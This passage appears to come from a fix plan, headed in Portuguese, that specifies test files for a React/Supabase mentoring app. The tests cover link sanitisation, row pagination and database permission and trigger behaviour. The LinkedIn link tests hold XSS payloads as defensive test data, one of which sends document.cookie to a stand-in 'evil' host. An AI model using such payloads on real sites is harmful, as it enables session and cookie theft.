    expect(calls.some(c => c.select.includes('profiles!'))).toBe(false);
    expect(calls.some(c => c.table === 'profiles_safe')).toBe(true);
    expect(res.data?.map(r => r.owner)).toEqual(['Ana', 'rui@x.pt', null]);
  });
});
```

### `src/pages/MentorProfile.rc12.test.tsx`
_(de: URLs escritos por utilizadores abertos sem validar o esquema, no perfil do mentor e nos Documentos do staff (ids: FEB-01, FEX-01, FES-08))_

**Criar `src/pages/MentorProfile.rc12.test.tsx`** (conteúdo exato):

```
import { render, screen, waitFor } from '@testing-library/react';
import { MemoryRouter, Route, Routes } from 'react-router-dom';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const state = vi.hoisted(() => ({ linkedin: 'https://www.linkedin.com/in/ana' as string | null }));

vi.mock('react-i18next', () => ({
  useTranslation: () => ({
    t: (k: string, o?: unknown) => (typeof o === 'string' ? o : (o as { defaultValue?: string })?.defaultValue ?? k),
  }),
}));
vi.mock('@/components/layout/AppLayout', () => ({ AppLayout: ({ children }: { children: React.ReactNode }) => <div>{children}</div> }));
vi.mock('@/contexts/AuthContext', () => ({ useAuth: () => ({ isStaff: true }) }));
vi.mock('@/lib/supabaseClient', () => {
  const builder = (table: string) => {
    const b: Record<string, unknown> = {};
    const self = () => b;
    b.select = self; b.eq = self;
    b.maybeSingle = () => Promise.resolve({
      data: table === 'profiles_safe'
        ? { id: 'm1', full_name: 'Ana Mentor', email: 'ana@x.pt', avatar_url: null, bio: null, expertise: [], linkedin_url: state.linkedin }
        : null,
      error: null,
    });
    b.then = (resolve: (v: unknown) => unknown) => resolve({ data: [], error: null });
    return b;
  };
  return { supabase: { from: (t: string) => builder(t) } };
});

import MentorProfile from './MentorProfile';

function renderPage() {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  render(
    <QueryClientProvider client={qc}>
      <MemoryRouter initialEntries={['/mentors/m1']}>
        <Routes><Route path="/mentors/:mentorId" element={<MentorProfile />} /></Routes>
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

describe('MentorProfile LinkedIn link', () => {
  beforeEach(() => { state.linkedin = 'https://www.linkedin.com/in/ana'; });

  it('renders a normal profile URL as an external link', async () => {
    renderPage();
    const link = await screen.findByText('LinkedIn');
    expect(link.closest('a')?.getAttribute('href')).toBe('https://www.linkedin.com/in/ana');
  });

  it('adds https:// to scheme-less values', async () => {
    state.linkedin = 'www.linkedin.com/in/ana';
    renderPage();
    const link = await screen.findByText('LinkedIn');
    expect(link.closest('a')?.getAttribute('href')).toBe('https://www.linkedin.com/in/ana');
  });

  it.each(['javascript:alert(document.domain)', 'JaVaScRiPt:alert(1)', 'java\tscript:alert(1)', 'data:text/html,x'])(
    'does not render a link for the dangerous value %j',
    async (value) => {
      state.linkedin = value;
      renderPage();
      await screen.findByText('Ana Mentor');
      await waitFor(() => expect(document.querySelector('a[href*="script" i], a[href^="data:"]')).toBeNull());
      expect(screen.queryByText('LinkedIn')).toBeNull();
    },
  );
});
```

### `src/hooks/useAdminData.rc12.test.tsx`
_(de: Gestão de utilizadores depende do limite implícito de 1000 linhas (ids: FEB-07; inclui FEB-13 e FEB-14 em AdminUsersManager))_

**Criar `src/hooks/useAdminData.rc12.test.tsx`** (conteúdo exato):

```
import { renderHook, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { createElement, type ReactNode } from 'react';
import { describe, expect, it, vi } from 'vitest';

// PostgREST answers at most 1000 rows per request, whatever range was asked.
const TOTAL = { profiles: 2300, user_roles: 1500 } as Record<string, number>;
const state = vi.hoisted(() => ({ calls: [] as string[], countError: null as null | Error }));

vi.mock('@/lib/supabaseClient', () => ({
  supabase: {
    from: (table: string) => {
      let from = 0;
      let to = 999;
      let head = false;
      const chain: Record<string, unknown> = {};
      for (const method of ['order', 'eq', 'not', 'gte', 'lte']) chain[method] = () => chain;
      chain.select = (_cols: string, opts?: { head?: boolean }) => { head = !!opts?.head; return chain; };
      chain.range = (f: number, t: number) => { from = f; to = Math.min(t, f + 999); return chain; };
      chain.then = (resolve: (value: unknown) => unknown) => {
        state.calls.push(`${table}:${from}`);
        if (head) {
          return Promise.resolve({ data: null, count: state.countError ? null : 3, error: state.countError }).then(resolve);
        }
        const n = Math.max(0, Math.min(to, (TOTAL[table] ?? 0) - 1) - from + 1);
        const data = Array.from({ length: n }, (_, i) => ({ id: `${table}-${from + i}` }));
        return Promise.resolve({ data, error: null }).then(resolve);
      };
      return chain;
    },
  },
}));

import { useAllProfiles, useUserRoles } from './useAdminData';
import { useBackofficeSidebarBadges } from './backoffice/useBackofficeSidebarBadges';

function wrapper({ children }: { children: ReactNode }) {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return createElement(QueryClientProvider, { client }, children);
}

describe('admin user lists are not truncated at the 1000-row response cap', () => {
  it('useAllProfiles pages through every profile', async () => {
    const { result, unmount } = renderHook(useAllProfiles, { wrapper });
    await waitFor(() => expect(result.current.isSuccess).toBe(true));
    expect(result.current.data).toHaveLength(2300);
    unmount();
  });

  it('useUserRoles pages through every user_roles row', async () => {
    const { result, unmount } = renderHook(useUserRoles, { wrapper });
    await waitFor(() => expect(result.current.isSuccess).toBe(true));
    expect(result.current.data).toHaveLength(1500);
    unmount();
  });
});

describe('backoffice sidebar badges', () => {
  it('sums the three counts when they succeed', async () => {
    const { result, unmount } = renderHook(() => useBackofficeSidebarBadges(true), { wrapper });
    await waitFor(() => expect(result.current.isSuccess).toBe(true));
    expect(result.current.data).toEqual({ expiringContracts: 3, pendingApprovals: 6 });
    unmount();
  });

  it('reports a failed count as an error instead of 0', async () => {
    state.countError = new Error('denied');
    const { result, unmount } = renderHook(() => useBackofficeSidebarBadges(true), { wrapper });
    await waitFor(() => expect(result.current.isError).toBe(true));
    expect(result.current.data).toBeUndefined();
    unmount();
    state.countError = null;
  });
});
```

### `src/components/admin/__tests__/AdminExternalMentorsManager.linkedin.rc12.test.tsx`
_(de: URLs escritas por utilizadores renderizadas como href sem sanitizar: XSS por clique no separador Mentores do admin (ids: FEB-01, FEX-01))_

**Criar `src/components/admin/__tests__/AdminExternalMentorsManager.linkedin.rc12.test.tsx`** (conteúdo exato):

```
import { render, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { describe, expect, it, vi } from 'vitest';
import { MemoryRouter } from 'react-router-dom';
import '@/i18n';


vi.mock('@/lib/supabaseClient', () => {
  const rows: Record<string, any[]> = {
    user_roles: [{ user_id: 'm1', role: 'mentor_externo' }],
    profiles_safe: [{ id: 'm1', email: 'm@x.pt', full_name: 'Mentor', avatar_url: null, linkedin_url: 'javascript:fetch("//evil/?c="+document.cookie)', bio: null, expertise: null }],
  };
  const mk = (t: string) => {
    const q: any = new Proxy(function () {}, {
      get: (_x, p) => (p === 'then' ? (res: any) => Promise.resolve({ data: rows[t] ?? [], error: null }).then(res) : q),
      apply: () => q,
    });
    return q;
  };
  return { supabase: { from: (t: string) => mk(t) } };
});
import { AdminExternalMentorsManager } from '@/components/admin/AdminExternalMentorsManager';

describe('mentor LinkedIn link', () => {
  it('never renders a javascript: href', async () => {
    const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
    render(<QueryClientProvider client={qc}><MemoryRouter><AdminExternalMentorsManager /></MemoryRouter></QueryClientProvider>);
    await waitFor(() => expect(document.body.textContent).toContain('Mentor'));
    const hrefs = Array.from(document.querySelectorAll('a')).map(a => a.getAttribute('href') || '');
    expect(hrefs.some(h => /^\s*javascript:/i.test(h))).toBe(false);
  });
});
```

### `supabase/tests/rc12_sql_sec_onboarding.test.sql`
_(de: Fluxo de onboarding: atribuir/criar workspace, candidaturas, reconcile e claim (ids: ONB-01, ONB-05, ONB-04, ONB-06, ONB-07))_

**Criar `supabase/tests/rc12_sql_sec_onboarding.test.sql`** (conteúdo exato):

```sql
-- RC12 (sql_sec) · onboarding, contas suspensas e convites: ONB-01, ONB-02, ONB-04, ONB-05, ONB-06, ONB-07, ONB-08, HRD-06, ED2-15, ONB-11.
-- Falha antes das migrações 20261103100000..20261103102000 e passa depois. Corre com `supabase test db`.
BEGIN;
SELECT plan(24);

-- contagem tolerante a erros (devolve -1 em vez de abortar a transação de teste)
CREATE FUNCTION pg_temp.rc12_count(p_rel text) RETURNS int LANGUAGE plpgsql AS $f$
DECLARE n int;
BEGIN
  EXECUTE format('SELECT count(*)::int FROM %s', p_rel) INTO n;
  RETURN n;
EXCEPTION WHEN OTHERS THEN RETURN -1;
END $f$;

INSERT INTO auth.users (id, email, email_confirmed_at) VALUES
  ('5ec00000-0000-4000-8000-000000000001', 'rc12sec-cons@test.com', now()),
  ('5ec00000-0000-4000-8000-000000000002', 'rc12sec-bo@test.com', now()),
  ('5ec00000-0000-4000-8000-000000000003', 'rc12sec-pending@test.com', now()),
  ('5ec00000-0000-4000-8000-000000000004', 'rc12sec-claimreq@test.com', now()),
  ('5ec00000-0000-4000-8000-000000000005', 'rc12sec-legal@test.com', now()),
  ('5ec00000-0000-4000-8000-000000000006', 'rc12sec-claimer@test.com', now()),
  ('5ec00000-0000-4000-8000-000000000007', 'rc12sec-admin@test.com', now()),
  ('5ec00000-0000-4000-8000-000000000008', 'rc12sec-stranger@test.com', now()),
  ('5ec00000-0000-4000-8000-000000000009', 'rc12sec-member@test.com', now()),
  ('5ec00000-0000-4000-8000-00000000000a', 'rc12sec-assignee@test.com', now())
ON CONFLICT (id) DO NOTHING;
INSERT INTO public.profiles (id, email, account_status) VALUES
  ('5ec00000-0000-4000-8000-000000000001', 'rc12sec-cons@test.com', 'approved'),
  ('5ec00000-0000-4000-8000-000000000002', 'rc12sec-bo@test.com', 'approved'),
  ('5ec00000-0000-4000-8000-000000000003', 'rc12sec-pending@test.com', 'pending'),
  ('5ec00000-0000-4000-8000-000000000004', 'rc12sec-claimreq@test.com', 'pending'),
  ('5ec00000-0000-4000-8000-000000000005', 'rc12sec-legal@test.com', 'suspended'),
  ('5ec00000-0000-4000-8000-000000000006', 'rc12sec-claimer@test.com', 'approved'),
  ('5ec00000-0000-4000-8000-000000000007', 'rc12sec-admin@test.com', 'approved'),
  ('5ec00000-0000-4000-8000-000000000008', 'rc12sec-stranger@test.com', 'approved'),
  ('5ec00000-0000-4000-8000-000000000009', 'rc12sec-member@test.com', 'approved'),
  ('5ec00000-0000-4000-8000-00000000000a', 'rc12sec-assignee@test.com', 'pending')
ON CONFLICT (id) DO UPDATE SET account_status = EXCLUDED.account_status;
DELETE FROM public.user_roles WHERE user_id::text LIKE '5ec00000-%';
INSERT INTO public.user_roles (user_id, role) VALUES
  ('5ec00000-0000-4000-8000-000000000001', 'consultor'),
  ('5ec00000-0000-4000-8000-000000000002', 'backoffice'),
  ('5ec00000-0000-4000-8000-000000000004', 'founder'),
  ('5ec00000-0000-4000-8000-000000000006', 'founder'),
  ('5ec00000-0000-4000-8000-000000000007', 'admin'),
  ('5ec00000-0000-4000-8000-000000000008', 'founder'),
  ('5ec00000-0000-4000-8000-000000000009', 'founder');
INSERT INTO public.programs (id, name) VALUES
  ('5ec00000-0000-4000-8000-0000000000e1', 'RC12 SEC Program'),
  ('5ec00000-0000-4000-8000-0000000000e2', 'RC12 SEC Program 2')
ON CONFLICT DO NOTHING;
INSERT INTO public.startups (id, name, main_contact_email) VALUES
  ('5ec00000-0000-4000-8000-0000000000b1', 'RC12 SEC Imported', 'rc12sec-claimer@test.com'),
  ('5ec00000-0000-4000-8000-0000000000b2', 'RC12 SEC Active', 'rc12sec-other@test.com'),
  ('5ec00000-0000-4000-8000-0000000000b3', 'RC12 SEC Imported 2', 'rc12sec-other2@test.com');
INSERT INTO public.workspaces (id, startup_id, program_id, status, needs_onboarding) VALUES
  ('5ec00000-0000-4000-8000-0000000000c1', '5ec00000-0000-4000-8000-0000000000b1', '5ec00000-0000-4000-8000-0000000000e1', 'imported_unclaimed', true),
  ('5ec00000-0000-4000-8000-0000000000c3', '5ec00000-0000-4000-8000-0000000000b1', '5ec00000-0000-4000-8000-0000000000e2', 'imported_unclaimed', true),
  ('5ec00000-0000-4000-8000-0000000000c2', '5ec00000-0000-4000-8000-0000000000b2', '5ec00000-0000-4000-8000-0000000000e1', 'active', true),
  ('5ec00000-0000-4000-8000-0000000000c4', '5ec00000-0000-4000-8000-0000000000b3', '5ec00000-0000-4000-8000-0000000000e1', 'imported_unclaimed', true);
INSERT INTO public.workspace_users (workspace_id, user_id, role, active) VALUES
  ('5ec00000-0000-4000-8000-0000000000c2', '5ec00000-0000-4000-8000-000000000001', 'consultor', true);

-- ONB-01: 'Criar workspace' para um claim pendente já não rebenta com "column reference workspace_id is ambiguous"
INSERT INTO public.startup_claim_requests (id, user_id, status, match_method, user_email)
VALUES ('5ec00000-0000-4000-8000-0000000000a1', '5ec00000-0000-4000-8000-000000000004', 'pending', 'manual_request', 'rc12sec-claimreq@test.com');
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000001","role":"authenticated"}', true);
SELECT lives_ok($$SELECT * FROM public.staff_create_workspace_for_claim('5ec00000-0000-4000-8000-0000000000a1','RC12 SEC Claim Co','5ec00000-0000-4000-8000-0000000000e1','ideation',NULL)$$,
  'ONB-01: staff_create_workspace_for_claim funciona');
SELECT set_config('role', 'postgres', true);
SELECT is((SELECT status FROM public.startup_claim_requests WHERE id = '5ec00000-0000-4000-8000-0000000000a1'), 'approved',
  'ONB-01: o claim fica aprovado');

-- ONB-05: a atribuição pela equipa mantém needs_onboarding (o founder preenche a Empresa e o NIF)
SELECT set_config('role', 'authenticated', true);
SELECT lives_ok($$SELECT * FROM public.staff_assign_or_create_workspace('5ec00000-0000-4000-8000-00000000000a','create',NULL,'RC12 SEC Nova','5ec00000-0000-4000-8000-0000000000e1','ideation',NULL)$$,
  'ONB-05: staff_assign_or_create_workspace create funciona');
SELECT set_config('role', 'postgres', true);
SELECT is((SELECT w.needs_onboarding FROM public.workspaces w JOIN public.startups s ON s.id = w.startup_id WHERE s.name = 'RC12 SEC Nova'), true,
  'ONB-05: um workspace criado pela equipa nasce com needs_onboarding=true');
SELECT set_config('role', 'authenticated', true);
SELECT lives_ok($$SELECT * FROM public.staff_assign_or_create_workspace('5ec00000-0000-4000-8000-000000000009','assign','5ec00000-0000-4000-8000-0000000000c2')$$,
  'ONB-05: assign a um workspace ativo funciona');
SELECT set_config('role', 'postgres', true);
SELECT is((SELECT needs_onboarding FROM public.workspaces WHERE id = '5ec00000-0000-4000-8000-0000000000c2'), true,
  'ONB-05: assign a um workspace ativo não apaga needs_onboarding');
SELECT set_config('role', 'authenticated', true);
SELECT lives_ok($$SELECT * FROM public.staff_assign_or_create_workspace('5ec00000-0000-4000-8000-00000000000a','assign','5ec00000-0000-4000-8000-0000000000c4')$$,
  'ONB-05: assign a um workspace importado funciona');
SELECT set_config('role', 'postgres', true);
SELECT is((SELECT needs_onboarding FROM public.workspaces WHERE id = '5ec00000-0000-4000-8000-0000000000c4'), false,
  'ONB-05: assign a um workspace importado continua a dispensar o assistente');

-- ONB-04: contas pendentes não se atribuem o papel founder nem criam candidaturas por RPC
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000003","role":"authenticated"}', true);
SELECT throws_ok($$SELECT public.ensure_founder_role()$$, '42501', 'account_not_active', 'ONB-04: conta pendente não obtém o papel founder');
SELECT throws_ok($$SELECT * FROM public.create_startup_application('Spam','ideation','5ec00000-0000-4000-8000-0000000000e1')$$, '42501', 'account_not_active',
  'ONB-04: conta pendente não cria candidatura');
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000008","role":"authenticated"}', true);
SELECT lives_ok($$SELECT * FROM public.create_startup_application('RC12 SEC App','ideation','5ec00000-0000-4000-8000-0000000000e1')$$,
  'ONB-04: conta aprovada continua a criar candidatura');

-- ONB-06: reconcile_contract_founders não ressuscita uma conta suspensa
SELECT set_config('role', 'postgres', true);
INSERT INTO public.startup_contracts (workspace_id, status, start_date, legal_representative_email, legal_representative_name, signed_at, signature_status)
VALUES ('5ec00000-0000-4000-8000-0000000000c2', 'active', current_date, 'rc12sec-legal@test.com', 'Legal', now(), 'signed');
SELECT public.reconcile_contract_founders();
SELECT is((SELECT count(*)::int FROM public.workspace_users WHERE user_id = '5ec00000-0000-4000-8000-000000000005'), 0,
  'ONB-06: conta suspensa não ganha adesão pelo reconcile');

-- ONB-07: claim_startup reclama todos os workspaces importados da startup
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000006","role":"authenticated"}', true);
SELECT public.claim_startup();
SELECT set_config('role', 'postgres', true);
SELECT is((SELECT status FROM public.workspaces WHERE id = '5ec00000-0000-4000-8000-0000000000c1'), 'active', 'ONB-07: claim_startup ativa o primeiro workspace importado');
SELECT is((SELECT status FROM public.workspaces WHERE id = '5ec00000-0000-4000-8000-0000000000c3'), 'active', 'ONB-07: claim_startup ativa também a outra edição');

-- ONB-08 / HRD-06 / ED2-15: aceitar convites
INSERT INTO public.workspace_users (workspace_id, user_id, role, active) VALUES
  ('5ec00000-0000-4000-8000-0000000000c2', '5ec00000-0000-4000-8000-000000000006', 'team_member', false),
  ('5ec00000-0000-4000-8000-0000000000c2', '5ec00000-0000-4000-8000-000000000008', 'team_member', true)
ON CONFLICT (workspace_id, user_id) DO UPDATE SET role = EXCLUDED.role, active = EXCLUDED.active;
INSERT INTO public.workspace_invitations (workspace_id, email, role, token_hash, created_by) VALUES
  ('5ec00000-0000-4000-8000-0000000000c2', 'rc12sec-claimer@test.com', 'team_member', 'rc12sec-react', '5ec00000-0000-4000-8000-000000000001'),
  ('5ec00000-0000-4000-8000-0000000000c2', 'rc12sec-stranger@test.com', 'founder', 'rc12sec-promote', '5ec00000-0000-4000-8000-000000000001');
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000006","role":"authenticated"}', true);
SELECT public.accept_workspace_invitation('rc12sec-react');
SELECT set_config('role', 'postgres', true);
SELECT is((SELECT active FROM public.workspace_users WHERE workspace_id = '5ec00000-0000-4000-8000-0000000000c2' AND user_id = '5ec00000-0000-4000-8000-000000000006'), true,
  'HRD-06: aceitar um convite reativa a adesão desativada');
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000008","role":"authenticated"}', true);
SELECT public.accept_workspace_invitation('rc12sec-promote');
SELECT set_config('role', 'postgres', true);
SELECT is((SELECT role::text FROM public.workspace_users WHERE workspace_id = '5ec00000-0000-4000-8000-0000000000c2' AND user_id = '5ec00000-0000-4000-8000-000000000008'), 'founder',
  'ONB-08: team_member ativo convidado como founder sobe a founder');
-- ED2-15: o convite já aceite não é devolvido a outra conta
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000009","role":"authenticated"}', true);
SELECT throws_ok($$SELECT public.accept_workspace_invitation('rc12sec-promote')$$, '42501', 'invitation_email_mismatch',
  'ED2-15: convite já aceite não revela workspace_id a outra conta');
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000008","role":"authenticated"}', true);
SELECT is((public.accept_workspace_invitation('rc12sec-promote') ->> 'already_accepted')::boolean, true,
  'ED2-15: a conta certa continua a receber already_accepted');

-- ONB-11: as políticas de workspace_invitations já não leem auth.users
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000001","email":"rc12sec-cons@test.com","role":"authenticated"}', true);
SELECT lives_ok($$SELECT count(*) FROM public.workspace_invitations$$, 'ONB-11: o staff lê convites sem "permission denied for table users"');
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000008","email":"rc12sec-stranger@test.com","role":"authenticated"}', true);
SELECT is(pg_temp.rc12_count('public.workspace_invitations'), 1, 'ONB-11: o convidado vê apenas o seu convite');

-- ONB-02: contas suspensas perdem os poderes de staff
SELECT set_config('role', 'postgres', true);
UPDATE public.profiles SET account_status = 'suspended' WHERE id IN ('5ec00000-0000-4000-8000-000000000001', '5ec00000-0000-4000-8000-000000000002', '5ec00000-0000-4000-8000-000000000007');
SELECT is(public.has_role('5ec00000-0000-4000-8000-000000000002'::uuid, 'backoffice'::public.app_role), false, 'ONB-02: has_role(backoffice) é false para conta suspensa');
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000002","role":"authenticated"}', true);
SELECT is(pg_temp.rc12_count('public.workspaces'), 0, 'ONB-02: backoffice suspenso não lê workspaces');
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000001","role":"authenticated"}', true);
SELECT throws_ok($$INSERT INTO public.workspace_invitations (workspace_id, email, role, token_hash, created_by) VALUES ('5ec00000-0000-4000-8000-0000000000c2','alias@test.com','founder','rc12sec-evil','5ec00000-0000-4000-8000-000000000001')$$,
  '42501', NULL, 'ONB-02: consultor suspenso não cria convites');
SELECT set_config('request.jwt.claims', '{"sub":"5ec00000-0000-4000-8000-000000000007","role":"authenticated"}', true);
SELECT throws_ok($$SELECT public.unblock_workspace('5ec00000-0000-4000-8000-0000000000c2')$$, NULL, 'Only admins can unblock workspaces',
  'ONB-02: admin suspenso não desbloqueia workspaces');

SELECT * FROM finish();
ROLLBACK;
```

### `supabase/tests/rc12_sql_db_triggers.test.sql`
_(de: Lead contratada pela cadeia de intake fica com type='lead' no CRM (ids: E2E-04))_

**Criar `supabase/tests/rc12_sql_db_triggers.test.sql`** (conteúdo exato):

```sql
-- RC12 (sql_db) · DBP-10 (updated_at), DBP-11 (FKs), DBP-12 (trigger duplicado em auth.users),
-- E2E-04 (lead contratada vira cliente operacional), CRM-08 (lembretes de assinatura recomecam), FEX-05 (links, so migracao).
-- Falha antes de 20261103204000, 208000 e 209000 _rc12_*.sql.
BEGIN;
SELECT plan(14);

-- ---- fixtures ---------------------------------------------------------------
INSERT INTO auth.users (id, email, email_confirmed_at) VALUES ('a1200000-0000-4000-8000-0000000000c1', 'rc12-trg@test.local', now());
INSERT INTO public.profiles (id, email, full_name, account_status)
VALUES ('a1200000-0000-4000-8000-0000000000c1', 'rc12-trg@test.local', 'Trg', 'approved')
ON CONFLICT (id) DO UPDATE SET account_status = 'approved';
INSERT INTO public.programs (id, name) VALUES ('e1200000-0000-4000-8000-0000000000e2', 'Programa RC12 triggers');
INSERT INTO public.startups (id, name) VALUES ('b1200000-0000-4000-8000-0000000000b1', 'Startup RC12 T');
INSERT INTO public.workspaces (id, startup_id, program_id, status)
VALUES ('c1200000-0000-4000-8000-0000000000c1', 'b1200000-0000-4000-8000-0000000000b1', 'e1200000-0000-4000-8000-0000000000e2', 'active');

-- ================= DBP-10 · updated_at avanca =================
INSERT INTO public.saved_filters (id, user_id, name, updated_at)
VALUES ('d1200000-0000-4000-8000-000000000001', 'a1200000-0000-4000-8000-0000000000c1', 'f', '2020-01-01');
UPDATE public.saved_filters SET name = 'f2' WHERE id = 'd1200000-0000-4000-8000-000000000001';
SELECT ok((SELECT updated_at > now() - interval '1 minute' FROM public.saved_filters WHERE id = 'd1200000-0000-4000-8000-000000000001'),
          'DBP-10: saved_filters.updated_at avanca num UPDATE');
INSERT INTO public.investors (id, startup_id, name, updated_at)
VALUES ('d1200000-0000-4000-8000-000000000002', 'b1200000-0000-4000-8000-0000000000b1', 'inv', '2020-01-01');
UPDATE public.investors SET name = 'inv2' WHERE id = 'd1200000-0000-4000-8000-000000000002';
SELECT ok((SELECT updated_at > now() - interval '1 minute' FROM public.investors WHERE id = 'd1200000-0000-4000-8000-000000000002'),
          'DBP-10: investors.updated_at avanca num UPDATE');
SELECT is((SELECT count(*)::int FROM pg_trigger WHERE NOT tgisinternal AND tgname LIKE 'trg\_%\_updated\_at'
             AND tgrelid::regclass::text IN ('investors','funding_rounds','cap_table_entries','workflow_rules','saved_filters','stage_gate_criteria',
                                             'health_model_templates','contract_notices','crm_import_conflicts','crm_lead_import_batches','contract_field_ownership')),
          11, 'DBP-10: 11 tabelas com trigger de updated_at');

-- ================= DBP-11 · chaves estrangeiras =================
SELECT ok(EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'mentor_connections_workspace_id_fkey' AND conrelid = 'public.mentor_connections'::regclass),
          'DBP-11: mentor_connections.workspace_id tem FK');
SELECT ok(EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'sessions_session_template_id_fkey' AND conrelid = 'public.sessions'::regclass),
          'DBP-11: sessions.session_template_id tem FK');
SELECT is((SELECT confdeltype::text FROM pg_constraint WHERE conname = 'survey_writebacks_applied_by_fkey' AND conrelid = 'public.survey_writebacks'::regclass),
          'n', 'DBP-11: survey_writebacks.applied_by passa a ON DELETE SET NULL');

-- ================= DBP-12 =================
SELECT is((SELECT count(*)::int FROM pg_trigger WHERE tgrelid = 'auth.users'::regclass AND NOT tgisinternal AND tgfoid = 'public.handle_new_user_role()'::regprocedure),
          1, 'DBP-12: um unico trigger em auth.users chama handle_new_user_role');

-- ================= E2E-04 · lead contratada com workspace =================
INSERT INTO public.funnel_items (id, stage, type, contact_name, organization_name, program_id)
VALUES ('f1200000-0000-4000-8000-0000000000a1', 'sent_for_signature', 'lead', 'L1', 'Org RC12 1', 'e1200000-0000-4000-8000-0000000000e2'),
       ('f1200000-0000-4000-8000-0000000000a2', 'sent_for_signature', 'lead', 'L2', 'Org RC12 2', 'e1200000-0000-4000-8000-0000000000e2');
UPDATE public.funnel_items SET stage = 'contracted' WHERE id = 'f1200000-0000-4000-8000-0000000000a2';
SELECT is((SELECT type FROM public.funnel_items WHERE id = 'f1200000-0000-4000-8000-0000000000a2'), 'lead',
          'E2E-04: lead contratada SEM workspace continua type=lead');
UPDATE public.funnel_items SET stage = 'contracted', linked_workspace_id = 'c1200000-0000-4000-8000-0000000000c1' WHERE id = 'f1200000-0000-4000-8000-0000000000a1';
SELECT is((SELECT type FROM public.funnel_items WHERE id = 'f1200000-0000-4000-8000-0000000000a1'), 'startup_active',
          'E2E-04: lead contratada COM workspace passa a startup_active');
SELECT ok((SELECT converted_at IS NOT NULL FROM public.funnel_items WHERE id = 'f1200000-0000-4000-8000-0000000000a1'),
          'E2E-04: converted_at preenchido');

-- ================= CRM-08 · lembretes de assinatura =================
INSERT INTO public.startup_contracts (id, status, start_date, monthly_fee, currency, funnel_item_id, organization_name, signature_provider)
VALUES ('d1200000-0000-4000-8000-0000000000d1', 'pending_signature', current_date, 100, 'EUR', 'f1200000-0000-4000-8000-0000000000a2', 'Org RC12 2', 'assinatura_digital');
INSERT INTO public.contract_intakes (id, contract_id, funnel_item_id, status, organization_name, legal_representative_email, intake_token_hash, reminder_count, last_reminder_sent_at)
VALUES ('d1200000-0000-4000-8000-0000000000e1', 'd1200000-0000-4000-8000-0000000000d1', 'f1200000-0000-4000-8000-0000000000a2', 'approved_for_signature',
        'Org RC12 2', 'l2@rc12.test', 'rc12-h1', 3, now() - interval '20 days');
UPDATE public.contract_intakes SET status = 'signature_sent' WHERE id = 'd1200000-0000-4000-8000-0000000000e1';
SELECT is((SELECT reminder_count FROM public.contract_intakes WHERE id = 'd1200000-0000-4000-8000-0000000000e1'), 0,
          'CRM-08: ao entrar em signature_sent o reminder_count recomeca');
SELECT ok((SELECT last_reminder_sent_at IS NULL FROM public.contract_intakes WHERE id = 'd1200000-0000-4000-8000-0000000000e1'),
          'CRM-08: last_reminder_sent_at recomeca');
UPDATE public.contract_intakes SET reminder_count = 1, last_reminder_sent_at = now() WHERE id = 'd1200000-0000-4000-8000-0000000000e1';
SELECT is((SELECT reminder_count FROM public.contract_intakes WHERE id = 'd1200000-0000-4000-8000-0000000000e1'), 1,
          'CRM-08: o UPDATE do cron (sem mudar o estado) nao e anulado');
SELECT ok(to_regprocedure('public.reset_intake_reminders_on_phase_change()') IS NOT NULL, 'CRM-08: funcao do trigger existe');

SELECT * FROM finish();
ROLLBACK;
```

### `supabase/tests/rc12_sql_db_retention_ops.test.sql`
_(de: Tabela integration_errors em falta e alertas dos monitores que ninguém lê (ids: SCH-02, OPS-02, OPS-01))_

**Criar `supabase/tests/rc12_sql_db_retention_ops.test.sql`** (conteúdo exato):

```sql
-- RC12 (sql_db) · DBP-07/OPS-12 (retencao), SCH-02/OPS-02 (integration_errors), OPS-01 (alertas -> administradores),
-- OPS-04 (partial conta como execucao viva), OPS-13 (URL base do cron). Falha antes de 20261103203000..207000_rc12_*.sql.
BEGIN;
SELECT plan(24);

-- ---- fixtures ---------------------------------------------------------------
INSERT INTO auth.users (id, email, email_confirmed_at) VALUES
  ('a1200000-0000-4000-8000-0000000000b1', 'rc12-ops-adm@test.local', now()),
  ('a1200000-0000-4000-8000-0000000000b2', 'rc12-ops-fnd@test.local', now());
INSERT INTO public.profiles (id, email, full_name, account_status) VALUES
  ('a1200000-0000-4000-8000-0000000000b1', 'rc12-ops-adm@test.local', 'Adm', 'approved'),
  ('a1200000-0000-4000-8000-0000000000b2', 'rc12-ops-fnd@test.local', 'Fnd', 'approved')
ON CONFLICT (id) DO UPDATE SET account_status = 'approved';
INSERT INTO public.user_roles (user_id, role) VALUES
  ('a1200000-0000-4000-8000-0000000000b1', 'admin'),
  ('a1200000-0000-4000-8000-0000000000b2', 'founder')
ON CONFLICT DO NOTHING;

-- ================= retencao (DBP-07 / OPS-12) =================
INSERT INTO public.client_error_logs (error_id, message, created_at) VALUES
  ('rc12-old', 'm', now() - interval '120 days'), ('rc12-new', 'm', now() - interval '10 days');
